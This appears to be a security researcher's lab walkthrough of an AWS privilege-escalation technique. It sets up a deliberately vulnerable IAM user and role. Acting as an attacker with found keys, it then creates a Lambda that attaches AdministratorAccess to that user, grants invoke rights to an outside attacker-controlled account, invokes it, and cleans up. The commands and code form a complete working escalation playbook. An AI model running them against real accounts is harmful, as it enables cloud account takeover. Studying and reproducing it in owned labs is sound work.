# Privilege Escalation w/ Cross Account Lambda Invocation

This technique was originally documented by RhinoSecurity within their tool [pacu](https://github.com/RhinoSecurityLabs/pacu).

RhinoSecurity has a well spring of information related to privilege escalation within AWS along with manual commands and the bare minimum permissions for executing the escalation successfully. An example of this type of documentation can be found [here](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/). Within this article they mention 21 different misconfigurations that can be abused to escalate privileges. However, in their tool pacu when running `run iam__privesc_scan --method-list` there is 27 methods available at the time of writing (15 February 2024). 

One of the methods within this list is called `PassExistingRoleToNewLambdaThenInvokeCrossAccount`. I was interested in understanding how this technique could be manually configured/executed without the use of pacu. Even though the tool was not used to execute this technique it did provide a lot of guidance for where to start.

By executing the following, pacu will provide a description about the privilege escalation technique. 

```bash
run iam__privesc_scan --method-info PassExistingRoleToNewLambdaThenInvokeCrossAccount
```

The output indicates that we would need the following privileges associated with an account/role we control for this to be a success.

```
iam:PassRole
lambda:CreateFunction
lambda:AddPermission
```

We will escalate privileges by passing an **existing** IAM role to a new Lambda function. This lambda function will then be provided a permission to allow an external account the **attacker** controls to invoke the function. In this case we will add code to escalate our privileges to (AdministratorAccess) on the account `MinimalIAMPassCreateAdd`. 

First we will setup the target environment. 

---

**Disclaimer: This will be intentionally vulnerable. It is not recommended to deploy this within a production environment. You will need to different AWS account numbers you control for this to work.**

---

# Pre-requisites Setup (Target Account)

1. A new user is created within our account.

```bash
aws iam create-user --user-name MinimalIAMPassCreateAdd
```

1. A new JSON file is created on our host machine. This will be the policy attached to `MinimalIAMPassCreateAdd` in the next step.

Filename: `user_role_perms.json`

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "iam:PassRole",
                "lambda:CreateFunction",
                "lambda:AddPermission",
                "iam:ListRoles",
                "iam:ListAttachedRolePolicies",
                "iam:GetPolicy",
                "iam:GetPolicyVersion"
            ],
            "Resource": "*"
        }
    ]
}
```

Some extra permissions are included here, while they are not necessary to actually complete the attack it would be difficult to identify which roles would be good candidates for your Lambda function without these.

1. Create the new policy.

```bash
aws iam create-policy --policy-name MinimalIAMLambda --policy-document file://user_role_perms.json
```

1. Attach the policy to the user we created.

```bash
aws iam attach-user-policy --policy-arn "arn:aws:iam::ACCOUNT_NUMBER:policy/MinimalIAMLambda" --user-name MinimalIAMPassCreateAdd
```

1. Create an access key for the user.

```bash
aws iam create-access-key --user-name MinimalIAMPassCreateAdd
```

Place these credentials in your `~/.aws/credentials` file. See example below.

```plaintext
[PROFILE_NAME]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
cli_pager = 
region = PREFERRED_REGION
```

1. A trust policy JSON file is created for the Lambda execution role.

Filename: `lambda_trust.json`

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "lambda.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

1. An IAM role is created with the above trust policy assigned.

```bash
aws iam create-role --role-name LambdaExecutionRole --assume-role-policy-document file://lambda_trust.json
```

1. A new JSON file is created for the policy document which will be attached to the Lambda function itself. We will escalate our privileges with `iam:AttachUserPolicy` in this scenario. Depending on the circumstances, the privileges available to you in a real world scenario will likely be different. Use what privileges you find along with other researched techniques to guide you.

Filename: `lambda_iam_perms.json`

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "logs:CreateLogGroup",
                "logs:CreateLogStream",
                "logs:PutLogEvents",
                "iam:AttachUserPolicy"
            ],
            "Resource": "*"
        }
    ]
}
```

1. Using the file above create the policy for a new role which will be assigned to the Lambda.

```bash
aws iam create-policy --policy-name LambdaIAMPolicy --policy-document file://lambda_iam_perms.json
```

1. Attach the policy you created to the role.

```bash
aws iam attach-role-policy --role-name LambdaExecutionRole --policy-arn arn:aws:iam::ACCOUNT_NUMBER:policy/LambdaIAMPolicy
```

# Execution

You will now pretend to be an "attacker" who has discovered a AWS access/secret pair which they will use to enumerate the environment and escalate privileges.

1. Validate the credentials obtained work.

```bash
aws sts get-caller-identity --profile PROFILE_NAME
```

For a more stealthy option the guidance [here](https://hackingthe.cloud/aws/enumeration/whoami/#sns-publish) can assist. 

1. Investigate the current roles contained within the account.

```bash
aws iam list-roles --profile PROFILE_NAME
```

1. The role which looks to be associated with Lambdas is queried. 

```bash
aws iam list-attached-role-policies --role-name LambdaExecutionRole --profile PROFILE_NAME
```

1. With the name of the policy obtained the versions are listed.

```bash
aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT_NUMBER:policy/LambdaIAMPolicy --profile PROFILE_NAME
```

1. Determining the permissions authorized.

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_NUMBER:policy/LambdaIAMPolicy --version-id v1 --profile PROFILE_NAME
```

1. Now that we see there is high permissions present, a Lambda function is created which can attach higher permissions to the user.

Filename: `lambda_function.py`

```python
import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName='MinimalIAMPassCreateAdd',PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
	return response
```

1. Create the lambda function. 

`zip function.zip lambda_function.py`

```bash
aws lambda create-function --profile PROFILE_NAME --function-name escalate_minimaluser --runtime python3.9 --role arn:aws:iam::ACCOUNT_NUMBER:role/LambdaExecutionRole --handler lambda_function.lambda_handler --zip-file fileb://function.zip --region PREFERRED_REGION
```

1. At this point we have a working function but with our current permissions we can not invoke it. This is where `lambda:AddPermission` can assist us. 

```bash
aws lambda add-permission --profile PROFILE_NAME --function-name escalate_minimaluser --statement-id AllowExternalInvoke --action "lambda:InvokeFunction" --principal ATTACKER_CONTROLLED_ACCOUNT_NUMBER --region PREFERRED_REGION
```

Keep in mind the `ATTACKER_CONTROLLED_ACCOUNT_NUMBER` is a completely different account than the one you are currently using.

1. **(Not Required)** We attempt to list the S3 buckets on the account, this will be denied due to our current permission set.

```bash
aws s3 ls --region PREFERRED_REGION --profile PROFILE_NAME
```

1. A new policy document is created, this will be for  the "attacker controlled" account.

Filename: `InvokeTargetLambdaPolicy.json`

```bash
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "lambda:InvokeFunction",
      "Resource": "arn:aws:lambda:TARGET_LAMBDA_REGION:ATTACKER_CONTROLLED_ACCOUNT_NUMBER:function:escalate_minimaluser"
    }
  ]
}
```

1. The policy is added to the attacker's account.

```bash
aws iam create-policy --policy-name LambdaInvokePolicy --policy-document file://InvokeTargetLambdaPolicy.json --profile PROFILE_FOR_ATTACKER_ACCOUNT
```

1. The policy is attached to another user they are in control of.

```bash
aws iam attach-user-policy --policy-arn arn:aws:iam::ATTACKER_CONTROLLED_ACCOUNT_NUMBER:policy/LambdaInvokePolicy --user-name ATTACKER_CONTROLLED_USERNAME --profile PROFILE_FOR_ATTACKER_ACCOUNT
```

1. The attacker can now invoke the function from their account.

```bash
aws lambda invoke --function-name arn:aws:lambda:TARGET_LAMBDA_REGION:TARGET_ACCOUNT_NUMBER:function:escalate_minimaluser --region TARGET_LAMBDA_REGION --profile PROFILE_FOR_ATTACKER_ACCOUNT response.json
```

1. Once invoked wait 5 mins or so for the changes to fully impact the account. Once done the new privileges will be attached.

```bash
aws s3 ls --region PREFERRED_REGION --profile PROFILE_NAME
```

This command should now succeed. Now that we have completed the proof of concept for privilege escalation we can revert the changes in the environment.

# Cleanup

1. Remove the external access permission.

```bash
aws lambda remove-permission --function-name escalate_minimaluser --statement-id AllowExternalInvoke
```

1. Delete the lambda function.

```bash
aws lambda delete-function --function-name escalate_minimaluser
```

1. Detach the policy from the role.

```bash
aws iam detach-role-policy --role-name LambdaExecutionRole --policy-arn arn:aws:iam::ACCOUNT_NUMBER:policy/LambdaIAMPolicy
```

1. Delete the policy.

```bash
aws iam delete-policy --policy-arn arn:aws:iam::ACCOUNT_NUMBER:policy/LambdaIAMPolicy
```

1. Delete the role.

```bash
aws iam delete-role --role-name LambdaExecutionRole
```

1. Detach the policies from the user.

```bash
aws iam detach-user-policy --user-name MinimalIAMPassCreateAdd --policy-arn arn:aws:iam::ACCOUNT_NUMBER:policy/MinimalIAMLambda

aws iam detach-user-policy --user-name MinimalIAMPassCreateAdd --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

1. Delete the user's access key.

```bash
aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --user-name MinimalIAMPassCreateAdd
```

1. Delete the user.

```bash
aws iam delete-user --user-name MinimalIAMPassCreateAdd
```

1. Delete the policy with limited permissions.
```bash
aws iam delete-policy --policy-arn arn:aws:iam::ACCOUNT_NUMBER:policy/MinimalIAMLambda
```

1. Detach the policy for external invoke from the attacker controlled account.

```bash
aws iam detach-user-policy --user-name ATTACKER_CONTROLLED_USERNAME --policy-arn arn:aws:iam::ATTACKER_CONTROLLED_ACCOUNT_NUMBER:policy/LambdaInvokePolicy --profile PROFILE_FOR_ATTACKER_ACCOUNT
```

1. Delete the policy from the attacker controlled account.

```bash
aws iam delete-policy --policy-arn arn:aws:iam::ATTACKER_CONTROLLED_ACCOUNT_NUMBER:policy/LambdaInvokePolicy --profile PROFILE_FOR_ATTACKER_ACCOUNT
```